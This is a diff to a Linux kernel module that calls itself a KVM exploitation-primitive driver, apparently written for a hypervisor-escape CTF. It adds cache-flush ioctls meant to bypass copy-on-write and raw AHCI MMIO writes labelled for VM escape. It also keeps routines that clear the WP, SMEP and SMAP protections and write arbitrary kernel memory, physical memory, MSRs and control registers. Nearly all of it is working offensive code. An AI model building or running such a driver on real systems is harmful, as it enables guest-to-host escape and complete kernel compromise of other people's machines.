@@ -1,4 +1,4 @@
-/*
+/* 
  * KVM Probe Driver - Core Infrastructure v2.2
  * Builds KVM exploitation primitives step by step
  * 
@@ -7,6 +7,7 @@
  * - Auto-disable security features before sensitive operations
  * - Enhanced hypercall support with better result parsing
  * - Guest memory mapping and gap analysis
+ * - Added cache operations and AHCI support
  */
 
 #include <linux/module.h>
@@ -123,6 +124,18 @@ static int g_auto_disable_security = 1;  /* Auto-disable before operations */
 #define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
 #define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)
 
+/* Cache Operations - for testing CoW bypass */
+#define IOCTL_WBINVD                  (IOCTL_BASE + 0x40)
+#define IOCTL_CLFLUSH                 (IOCTL_BASE + 0x41)
+#define IOCTL_WRITE_AND_FLUSH         (IOCTL_BASE + 0x42)
+
+/* AHCI Direct Access */
+#define IOCTL_AHCI_INIT               (IOCTL_BASE + 0x50)
+#define IOCTL_AHCI_READ_REG           (IOCTL_BASE + 0x51)
+#define IOCTL_AHCI_WRITE_REG          (IOCTL_BASE + 0x52)
+#define IOCTL_AHCI_SET_FIS_BASE       (IOCTL_BASE + 0x53)
+#define IOCTL_AHCI_INFO               (IOCTL_BASE + 0x54)
+
 /* Hypercall operations */
 #define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
 #define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)
@@ -217,7 +230,7 @@ struct kernel_mem_write {
     unsigned long kernel_addr;
     unsigned long length;
     unsigned char __user *user_buffer;
-    int disable_wp_flag;
+    int force_disable_wp_flag;
 };
 
 struct physical_mem_write {
@@ -367,6 +380,41 @@ struct guest_memory_map {
     unsigned long regions[64][2];  /* [start, end] pairs */
 };
 
+/* Cache operation structures */
+struct clflush_request {
+    unsigned long virt_addr;
+    unsigned long phys_addr;
+    int use_phys;
+};
+
+struct write_flush_request {
+    unsigned long phys_addr;
+    unsigned long buffer;
+    unsigned long size;
+};
+
+/* AHCI structures */
+struct ahci_reg_request {
+    unsigned int port;
+    unsigned int offset;
+    unsigned int value;
+    int is_write;
+};
+
+struct ahci_fis_request {
+    unsigned int port;
+    unsigned long fis_base;
+    unsigned long clb_base;
+};
+
+struct ahci_info {
+    unsigned int cap;
+    unsigned int ghc;
+    unsigned int pi;
+    unsigned int vs;
+    unsigned int port_ssts[6];
+};
+
 /* ========================================================================
  * Symbol Database
  * ======================================================================== */
@@ -437,6 +485,31 @@ static struct {
 static struct { const char *name; unsigned long address; } svm_handlers[] = {
     {"svm_handle_exit", 0}, {"svm_intr_intercept", 0}, {NULL, 0}
 };
+
+/* ========================================================================
+ * Forward Declarations (to fix compilation errors)
+ * ======================================================================== */
+#ifdef CONFIG_X86
+static unsigned long force_disable_wp(void);
+static void restore_wp(unsigned long cr0);
+static void wbinvd_all_cpus(void);
+static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer, size_t size);
+static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, size_t size);
+static int read_physical_via_pfn(unsigned long phys_addr, unsigned char *buffer, size_t size);
+static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, size_t size);
+static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size);
+#endif
+static int map_guest_memory(struct guest_memory_map *map);
+static int scan_memory_region(struct mem_region *region, struct mem_pattern *pattern,
+                               unsigned long __user *results, int max_results);
+static int find_pattern_in_range(unsigned long start, unsigned long end,
+                                  const unsigned char *pattern, size_t pattern_len,
+                                  unsigned long *found_addr, int region_type);
+static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size);
+static int write_physical_memory(unsigned long phys_addr, const unsigned char *buffer, size_t size);
+static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t size);
+static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
+                                size_t size, int force_disable_wp_flag);
 
 /* ========================================================================
  * Kernel Symbol Lookup
@@ -566,76 +639,80 @@ static void run_ctf_hypercalls_batch(struct hypercall_batch_result *result) {
  * ======================================================================== */
 
 #ifdef CONFIG_X86
-static inline unsigned long native_read_cr3_local(void)
-{
-    unsigned long val;
-    asm volatile("mov %%cr3, %0" : "=r"(val));
-    return val;
-}
 
 static unsigned long read_cr_register(int cr_num)
 {
+    unsigned long val;
     switch (cr_num) {
-        case 0: return native_read_cr0();
-        case 2: return native_read_cr2();
-        case 3: return native_read_cr3_local();
-        case 4: return native_read_cr4();
-        default: return 0;
+        case 0: asm volatile("mov %%cr0, %0" : "=r"(val)); break;
+        case 2: asm volatile("mov %%cr2, %0" : "=r"(val)); break;
+        case 3: asm volatile("mov %%cr3, %0" : "=r"(val)); break;
+        case 4: asm volatile("mov %%cr4, %0" : "=r"(val)); break;
+        default: val = 0;
     }
+    return val;
 }
 
-/* Force disable write protect - more aggressive */
-static void force_disable_wp(void)
+static void write_cr4_register(unsigned long val)
 {
-    unsigned long cr0;
-    preempt_disable();
-    barrier();
-    
-    asm volatile("mov %%cr0, %0" : "=r"(cr0));
-    cr0 &= ~(1UL << 16);  /* Clear WP bit */
-    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
-    
-    barrier();
-    preempt_enable();
-    
-    printk(KERN_INFO "%s: WP disabled (CR0 = 0x%lx)\n", DRIVER_NAME, native_read_cr0());
+    asm volatile("mov %0, %%cr4" : : "r"(val) : "memory");
 }
 
-/* Force disable SMEP - more aggressive */
+static void write_cr0_register(unsigned long val)
+{
+    asm volatile("mov %0, %%cr0" : : "r"(val) : "memory");
+}
+
+static void write_cr3_register(unsigned long val)
+{
+    asm volatile("mov %0, %%cr3" : : "r"(val) : "memory");
+}
+
+static unsigned long force_disable_wp(void)
+{
+    unsigned long cr0 = read_cr_register(0);
+    unsigned long new_cr0 = cr0 & ~(1UL << 16);  /* Clear WP bit */
+    write_cr0_register(new_cr0);
+    return cr0;  /* Return original CR0 value */
+}
+
+static void restore_wp(unsigned long cr0)
+{
+    write_cr0_register(cr0);
+}
+
 static void force_disable_smep(void)
 {
     unsigned long cr4;
     preempt_disable();
     barrier();
     
-    asm volatile("mov %%cr4, %0" : "=r"(cr4));
+    cr4 = read_cr_register(4);
     cr4 &= ~(1UL << 20);  /* Clear SMEP bit */
-    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
+    write_cr4_register(cr4);
     
     barrier();
     preempt_enable();
     
-    printk(KERN_INFO "%s: SMEP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, native_read_cr4());
+    printk(KERN_INFO "%s: SMEP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, read_cr_register(4));
 }
 
-/* Force disable SMAP - more aggressive */
 static void force_disable_smap(void)
 {
     unsigned long cr4;
     preempt_disable();
     barrier();
     
-    asm volatile("mov %%cr4, %0" : "=r"(cr4));
+    cr4 = read_cr_register(4);
     cr4 &= ~(1UL << 21);  /* Clear SMAP bit */
-    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
+    write_cr4_register(cr4);
     
     barrier();
     preempt_enable();
     
-    printk(KERN_INFO "%s: SMAP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, native_read_cr4());
+    printk(KERN_INFO "%s: SMAP disabled (CR4 = 0x%lx)\n", DRIVER_NAME, read_cr_register(4));
 }
 
-/* Disable all security features */
 static void disable_all_security(void)
 {
     printk(KERN_INFO "%s: Disabling all security features\n", DRIVER_NAME);
@@ -644,22 +721,33 @@ static void disable_all_security(void)
     force_disable_smap();
 }
 
-/* Auto-disable if enabled */
-static inline void auto_disable_security(void)
+static int write_cr_register_impl(int cr_num, unsigned long value, unsigned long mask)
 {
-    if (g_auto_disable_security) {
-        disable_all_security();
+    unsigned long current_val, new_val;
+    if (mask == 0) mask = ~0UL;
+
+    switch (cr_num) {
+        case 0:
+            current_val = read_cr_register(0);
+            new_val = (current_val & ~mask) | (value & mask);
+            write_cr0_register(new_val);
+            break;
+        case 3:
+            current_val = read_cr_register(3);
+            new_val = (current_val & ~mask) | (value & mask);
+            write_cr3_register(new_val);
+            break;
+        case 4:
+            current_val = read_cr_register(4);
+            new_val = (current_val & ~mask) | (value & mask);
+            write_cr4_register(new_val);
+            break;
+        default:
+            return -EINVAL;
     }
-}
 
-static unsigned long disable_wp(void)
-{
-    unsigned long cr0 = native_read_cr0();
-    native_write_cr0(cr0 & ~(1UL << 16));
-    return cr0;
+    return 0;
 }
-
-static void restore_wp(unsigned long cr0) { native_write_cr0(cr0); }
 #endif
 
 /* ========================================================================
@@ -673,7 +761,11 @@ static int read_kernel_memory(unsigned long addr, unsigned char *buffer, size_t 
     int i;
     if (!is_kernel_address(addr)) return -EINVAL;
     
-    auto_disable_security();
+    #ifdef CONFIG_X86
+    if (g_auto_disable_security) {
+        disable_all_security();
+    }
+    #endif
     
     preempt_disable();
     barrier();
@@ -923,18 +1015,19 @@ static int map_guest_memory(struct guest_memory_map *map)
  * ======================================================================== */
 
 static int write_kernel_memory(unsigned long addr, const unsigned char *buffer, 
-                                size_t size, int disable_wp_flag)
+                                size_t size, int force_disable_wp_flag)
 {
     unsigned long orig_cr0 = 0;
     int i;
 
     if (!is_kernel_address(addr)) return -EINVAL;
 
-    auto_disable_security();
-
-#ifdef CONFIG_X86
-    if (disable_wp_flag) orig_cr0 = disable_wp();
-#endif
+    #ifdef CONFIG_X86
+    if (g_auto_disable_security) {
+        disable_all_security();
+    }
+    if (force_disable_wp_flag) orig_cr0 = force_disable_wp();
+    #endif
 
     preempt_disable();
     barrier();
@@ -943,9 +1036,9 @@ static int write_kernel_memory(unsigned long addr, const unsigned char *buffer,
     barrier();
     preempt_enable();
 
-#ifdef CONFIG_X86
-    if (disable_wp_flag) restore_wp(orig_cr0);
-#endif
+    #ifdef CONFIG_X86
+    if (force_disable_wp_flag) restore_wp(orig_cr0);
+    #endif
 
     run_ctf_hypercalls();
     return 0;
@@ -957,7 +1050,11 @@ static int write_physical_memory(unsigned long phys_addr, const unsigned char *b
     unsigned long offset;
     size_t chunk_size, remaining = size, written = 0;
 
-    auto_disable_security();
+    #ifdef CONFIG_X86
+    if (g_auto_disable_security) {
+        disable_all_security();
+    }
+    #endif
 
     while (remaining > 0) {
         offset = phys_addr & ~PAGE_MASK;
@@ -983,7 +1080,11 @@ static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *
     void *kaddr;
     size_t to_copy, written = 0;
 
-    auto_disable_security();
+    #ifdef CONFIG_X86
+    if (g_auto_disable_security) {
+        disable_all_security();
+    }
+    #endif
 
     while (written < size) {
         if (!pfn_valid(pfn)) return written > 0 ? 0 : -EINVAL;
@@ -1028,40 +1129,9 @@ static int write_msr_safe_local(u32 msr, u64 value)
     if (!err) run_ctf_hypercalls();
     return err;
 }
-
-static int write_cr_register(int cr_num, unsigned long value, unsigned long mask)
-{
-    unsigned long current_val, new_val;
-    if (mask == 0) mask = ~0UL;
-
-    auto_disable_security();
-
-    switch (cr_num) {
-        case 0:
-            current_val = native_read_cr0();
-            new_val = (current_val & ~mask) | (value & mask);
-            native_write_cr0(new_val);
-            break;
-        case 3:
-            current_val = native_read_cr3_local();
-            new_val = (current_val & ~mask) | (value & mask);
-            asm volatile("mov %0, %%cr3" : : "r"(new_val) : "memory");
-            break;
-        case 4:
-            current_val = native_read_cr4();
-            new_val = (current_val & ~mask) | (value & mask);
-            __write_cr4(new_val);
-            break;
-        default:
-            return -EINVAL;
-    }
-
-    run_ctf_hypercalls();
-    return 0;
-}
 #endif
 
-static int memset_kernel_memory(unsigned long addr, unsigned char value, size_t size)
+static int memset_kernel_memory_impl(unsigned long addr, unsigned char value, size_t size)
 {
     unsigned char *buffer = kmalloc(size, GFP_KERNEL);
     int ret;
@@ -1072,7 +1142,7 @@ static int memset_kernel_memory(unsigned long addr, unsigned char value, size_t 
     return ret;
 }
 
-static int memset_physical_memory(unsigned long phys_addr, unsigned char value, size_t size)
+static int memset_physical_memory_impl(unsigned long phys_addr, unsigned char value, size_t size)
 {
     unsigned char *buffer = kmalloc(size, GFP_KERNEL);
     int ret;
@@ -1213,7 +1283,15 @@ static int convert_hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
     if (hva < TASK_SIZE && current->mm) {
         int ret;
         mmap_read_lock(current->mm);
-        ret = get_user_pages(hva, 1, 0, &page, NULL);
+        
+        #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 9, 0)
+        ret = get_user_pages(hva, 1, FOLL_GET, &page, NULL);
+        #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 9, 0)
+        ret = get_user_pages(hva, 1, FOLL_GET | FOLL_FORCE, &page, NULL);
+        #else
+        ret = get_user_pages(current, current->mm, hva, 1, 0, 1, &page, NULL);
+        #endif
+        
         mmap_read_unlock(current->mm);
         if (ret == 1) {
             req->pfn = page_to_pfn(page);
@@ -1386,6 +1464,179 @@ static int convert_virt_to_pfn(unsigned long virt_addr, unsigned long *pfn)
 }
 
 /* ========================================================================
+ * Cache Operations Implementation
+ * ======================================================================== */
+
+#ifdef CONFIG_X86
+/* WBINVD on a single CPU */
+static void do_wbinvd(void *info)
+{
+    asm volatile("wbinvd" ::: "memory");
+}
+
+/* Execute WBINVD on all CPUs */
+static void wbinvd_all_cpus(void)
+{
+    printk(KERN_INFO "%s: Executing WBINVD on all CPUs\n", DRIVER_NAME);
+    on_each_cpu(do_wbinvd, NULL, 1);
+    printk(KERN_INFO "%s: WBINVD complete on all CPUs\n", DRIVER_NAME);
+}
+
+/* CLFLUSH on a specific virtual address */
+static void clflush_addr(void *addr)
+{
+    asm volatile("clflush (%0)" :: "r"(addr) : "memory");
+}
+
+/* Memory fence */
+static void do_mfence(void)
+{
+    asm volatile("mfence" ::: "memory");
+}
+
+/* SFENCE - store fence */
+static void do_sfence(void)
+{
+    asm volatile("sfence" ::: "memory");
+}
+
+/* Write to physical memory with cache flush */
+static int write_physical_and_flush(unsigned long phys_addr, const unsigned char *buffer,
+                                     size_t size)
+{
+    void *virt_addr;
+    unsigned long orig_cr0 = 0;
+
+    printk(KERN_INFO "%s: write_physical_and_flush: phys=0x%lx size=%zu\n",
+           DRIVER_NAME, phys_addr, size);
+
+    /* Get virtual address */
+    virt_addr = __va(phys_addr);
+    
+    if (!virt_addr_valid((unsigned long)virt_addr)) {
+        printk(KERN_WARNING "%s: Virtual address %p not valid\n", DRIVER_NAME, virt_addr);
+        return -EFAULT;
+    }
+
+    /* Disable write protection */
+    orig_cr0 = force_disable_wp();
+
+    /* Perform the write */
+    memcpy(virt_addr, buffer, size);
+
+    /* Memory barrier before flush */
+    do_mfence();
+
+    /* Flush the specific cache line */
+    clflush_addr(virt_addr);
+
+    /* Store fence to ensure flush completes */
+    do_sfence();
+
+    /* Another memory barrier */
+    do_mfence();
+
+    /* WBINVD on all CPUs for extra certainty */
+    wbinvd_all_cpus();
+
+    /* Restore write protection */
+    restore_wp(orig_cr0);
+
+    printk(KERN_INFO "%s: Write + flush complete for phys 0x%lx\n",
+           DRIVER_NAME, phys_addr);
+
+    return 0;
+}
+#endif
+
+/* ========================================================================
+ * AHCI Direct Access (for VM escape attempts)
+ * ======================================================================== */
+
+#define AHCI_MMIO_BASE  0xfea0e000
+#define AHCI_MMIO_SIZE  0x1000
+
+/* AHCI Port registers */
+#define AHCI_PORT_BASE(p) (0x100 + (p) * 0x80)
+#define PORT_CLB        0x00
+#define PORT_CLB_HI     0x04
+#define PORT_FB         0x08
+#define PORT_FB_HI      0x0C
+#define PORT_IS         0x10
+#define PORT_CMD        0x18
+#define PORT_SSTS       0x28
+#define PORT_CI         0x38
+
+static void __iomem *ahci_mmio = NULL;
+
+static int ahci_map_mmio(void)
+{
+    if (ahci_mmio)
+        return 0;  /* Already mapped */
+    
+    ahci_mmio = ioremap(AHCI_MMIO_BASE, AHCI_MMIO_SIZE);
+    if (!ahci_mmio) {
+        printk(KERN_ERR "%s: Failed to ioremap AHCI MMIO\n", DRIVER_NAME);
+        return -ENOMEM;
+    }
+    
+    printk(KERN_INFO "%s: AHCI MMIO mapped at %p\n", DRIVER_NAME, ahci_mmio);
+    return 0;
+}
+
+static void ahci_unmap_mmio(void)
+{
+    if (ahci_mmio) {
+        iounmap(ahci_mmio);
+        ahci_mmio = NULL;
+    }
+}
+
+static u32 ahci_read32(u32 offset)
+{
+    if (!ahci_mmio)
+        return 0;
+    return readl(ahci_mmio + offset);
+}
+
+static void ahci_write32(u32 offset, u32 value)
+{
+    if (!ahci_mmio)
+        return;
+    writel(value, ahci_mmio + offset);
+}
+
+/* Set FIS base address for a port */
+static void ahci_set_fis_base(int port, u64 phys_addr)
+{
+    u32 port_base = AHCI_PORT_BASE(port);
+    
+    printk(KERN_INFO "%s: Setting port %d FIS base to 0x%llx\n", 
+           DRIVER_NAME, port, phys_addr);
+    
+    ahci_write32(port_base + PORT_FB, phys_addr & 0xffffffff);
+    ahci_write32(port_base + PORT_FB_HI, phys_addr >> 32);
+}
+
+/* Set command list base address for a port */
+static void ahci_set_clb(int port, u64 phys_addr)
+{
+    u32 port_base = AHCI_PORT_BASE(port);
+    
+    printk(KERN_INFO "%s: Setting port %d CLB to 0x%llx\n", 
+           DRIVER_NAME, port, phys_addr);
+    
+    ahci_write32(port_base + PORT_CLB, phys_addr & 0xffffffff);
+    ahci_write32(port_base + PORT_CLB_HI, phys_addr >> 32);
+}
+
+/* Get port status */
+static u32 ahci_get_port_status(int port)
+{
+    return ahci_read32(AHCI_PORT_BASE(port) + PORT_SSTS);
+}
+
+/* ========================================================================
  * IOCTL Handler
  * ======================================================================== */
 
@@ -1404,7 +1655,9 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return 0;
 
         case IOCTL_FORCE_DISABLE_SECURITY:
+            #ifdef CONFIG_X86
             disable_all_security();
+            #endif
             return 0;
 
         /* Symbol Operations */
@@ -1604,7 +1857,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return ret;
         }
 
-#ifdef CONFIG_X86
+        #ifdef CONFIG_X86
         case IOCTL_READ_CR_REGISTER: {
             struct { int cr_num; unsigned long value; } cr_req;
             if (copy_from_user(&cr_req, (void __user *)arg, sizeof(cr_req))) return -EFAULT;
@@ -1626,7 +1879,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             if (dump_page_tables(dump.virtual_addr, &dump) < 0) return -EFAULT;
             return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : 0;
         }
-#endif
+        #endif
 
         case IOCTL_GET_KASLR_INFO: {
             struct kaslr_info info;
@@ -1652,7 +1905,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             kbuf = kmalloc(req.length, GFP_KERNEL);
             if (!kbuf) return -ENOMEM;
             if (copy_from_user(kbuf, req.user_buffer, req.length)) { kfree(kbuf); return -EFAULT; }
-            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.disable_wp_flag);
+            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.force_disable_wp_flag);
             kfree(kbuf);
             return ret;
         }
@@ -1703,7 +1956,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             return ret;
         }
 
-#ifdef CONFIG_X86
+        #ifdef CONFIG_X86
         case IOCTL_WRITE_MSR: {
             struct msr_write_request req;
             if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
@@ -1714,22 +1967,22 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
             struct cr_write_request req;
             if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
             if (req.cr_num < 0 || req.cr_num > 4 || req.cr_num == 1 || req.cr_num == 2) return -EINVAL;
-            return write_cr_register(req.cr_num, req.value, req.mask);
+            return write_cr_register_impl(req.cr_num, req.value, req.mask);
         }
-#endif
+        #endif
 
         case IOCTL_MEMSET_KERNEL: {
             struct memset_request req;
             if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
             if (!req.addr || !req.length || req.length > 1024*1024) return -EINVAL;
-            return memset_kernel_memory(req.addr, req.value, req.length);
+            return memset_kernel_memory_impl(req.addr, req.value, req.length);
         }
 
         case IOCTL_MEMSET_PHYSICAL: {
             struct memset_request req;
             if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
             if (!req.length || req.length > 1024*1024) return -EINVAL;
-            return memset_physical_memory(req.addr, req.value, req.length);
+            return memset_physical_memory_impl(req.addr, req.value, req.length);
         }
 
         case IOCTL_PATCH_BYTES: {
@@ -1866,7 +2119,7 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
 
         /* Hypercall Operations */
         case IOCTL_HYPERCALL: {
-#ifdef CONFIG_X86
+            #ifdef CONFIG_X86
             struct hypercall_request req;
             if (copy_from_user(&req, (void __user *)arg, sizeof(req))) return -EFAULT;
             req.ret = do_kvm_hypercall(req.nr, req.a0, req.a1, req.a2, req.a3);
@@ -1874,25 +2127,194 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
                 printk(KERN_INFO "%s: Hypercall %lu returned 0x%lx\n", DRIVER_NAME, req.nr, req.ret);
             if (copy_to_user((void __user *)arg, &req, sizeof(req))) return -EFAULT;
             return 0;
-#else
+            #else
             return -ENOSYS;
-#endif
+            #endif
         }
 
         case IOCTL_HYPERCALL_BATCH: {
-#ifdef CONFIG_X86
+            #ifdef CONFIG_X86
             struct hypercall_batch_result result;
             run_ctf_hypercalls_batch(&result);
             if (copy_to_user((void __user *)arg, &result, sizeof(result))) return -EFAULT;
             return 0;
-#else
+            #else
             return -ENOSYS;
-#endif
+            #endif
+        }
+
+        /* Cache Operations */
+        case IOCTL_WBINVD: {
+            #ifdef CONFIG_X86
+            printk(KERN_INFO "%s: IOCTL_WBINVD - flushing all caches\n", DRIVER_NAME);
+            wbinvd_all_cpus();
+            return 0;
+            #else
+            return -ENOSYS;
+            #endif
+        }
+
+        case IOCTL_CLFLUSH: {
+            #ifdef CONFIG_X86
+            struct clflush_request req;
+            void *addr;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (req.use_phys) {
+                addr = __va(req.phys_addr);
+            } else {
+                addr = (void *)req.virt_addr;
+            }
+
+            printk(KERN_INFO "%s: IOCTL_CLFLUSH - flushing addr %p\n", DRIVER_NAME, addr);
+            
+            if (virt_addr_valid((unsigned long)addr)) {
+                clflush_addr(addr);
+                do_mfence();
+            } else {
+                printk(KERN_WARNING "%s: Address %p not valid for CLFLUSH\n", DRIVER_NAME, addr);
+                return -EFAULT;
+            }
+            
+            return 0;
+            #else
+            return -ENOSYS;
+            #endif
+        }
+
+        case IOCTL_WRITE_AND_FLUSH: {
+            #ifdef CONFIG_X86
+            struct write_flush_request req;
+            unsigned char *kbuf;
+            int ret;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (!req.size || !req.buffer || req.size > 1024 * 1024) {
+                return -EINVAL;
+            }
+
+            kbuf = kmalloc(req.size, GFP_KERNEL);
+            if (!kbuf) {
+                return -ENOMEM;
+            }
+
+            if (copy_from_user(kbuf, (void __user *)req.buffer, req.size)) {
+                kfree(kbuf);
+                return -EFAULT;
+            }
+
+            ret = write_physical_and_flush(req.phys_addr, kbuf, req.size);
+            kfree(kbuf);
+            return ret;
+            #else
+            return -ENOSYS;
+            #endif
+        }
+
+        /* AHCI Direct Access */
+        case IOCTL_AHCI_INIT: {
+            return ahci_map_mmio();
+        }
+
+        case IOCTL_AHCI_READ_REG: {
+            struct ahci_reg_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port < 6) {
+                req.value = ahci_read32(AHCI_PORT_BASE(req.port) + req.offset);
+            } else {
+                req.value = ahci_read32(req.offset);
+            }
+
+            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
+        }
+
+        case IOCTL_AHCI_WRITE_REG: {
+            struct ahci_reg_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port < 6) {
+                ahci_write32(AHCI_PORT_BASE(req.port) + req.offset, req.value);
+            } else {
+                ahci_write32(req.offset, req.value);
+            }
+
+            printk(KERN_INFO "%s: AHCI write port %d offset 0x%x = 0x%x\n",
+                   DRIVER_NAME, req.port, req.offset, req.value);
+            return 0;
+        }
+
+        case IOCTL_AHCI_SET_FIS_BASE: {
+            struct ahci_fis_request req;
+
+            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+                return -EFAULT;
+            }
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            if (req.port >= 6) {
+                return -EINVAL;
+            }
+
+            /* Set FIS base - this is the key for the exploit! */
+            ahci_set_fis_base(req.port, req.fis_base);
+            
+            if (req.clb_base) {
+                ahci_set_clb(req.port, req.clb_base);
+            }
+
+            return 0;
+        }
+
+        case IOCTL_AHCI_INFO: {
+            struct ahci_info info;
+
+            if (ahci_map_mmio() < 0) {
+                return -EIO;
+            }
+
+            info.cap = ahci_read32(0x00);
+            info.ghc = ahci_read32(0x04);
+            info.pi = ahci_read32(0x0C);
+            info.vs = ahci_read32(0x10);
+
+            for (int i = 0; i < 6; i++) {
+                info.port_ssts[i] = ahci_get_port_status(i);
+            }
+
+            printk(KERN_INFO "%s: AHCI CAP=0x%x GHC=0x%x PI=0x%x VS=0x%x\n",
+                   DRIVER_NAME, info.cap, info.ghc, info.pi, info.vs);
+
+            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
         }
 
         default:
             return -ENOTTY;
     }
+
     return 0;
 }
 
@@ -1919,11 +2341,11 @@ static int __init mod_init(void)
     major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
     if (major_num < 0) return major_num;
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+    #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
     driver_class = class_create(DRIVER_NAME);
-#else
+    #else
     driver_class = class_create(THIS_MODULE, DRIVER_NAME);
-#endif
+    #endif
     if (IS_ERR(driver_class)) { unregister_chrdev(major_num, DEVICE_FILE_NAME); return PTR_ERR(driver_class); }
 
     driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_FILE_NAME);
@@ -1935,6 +2357,7 @@ static int __init mod_init(void)
 
 static void __exit mod_exit(void)
 {
+    ahci_unmap_mmio();
     if (driver_device) device_destroy(driver_class, MKDEV(major_num, 0));
     if (driver_class) class_destroy(driver_class);
     if (major_num >= 0) unregister_chrdev(major_num, DEVICE_FILE_NAME);
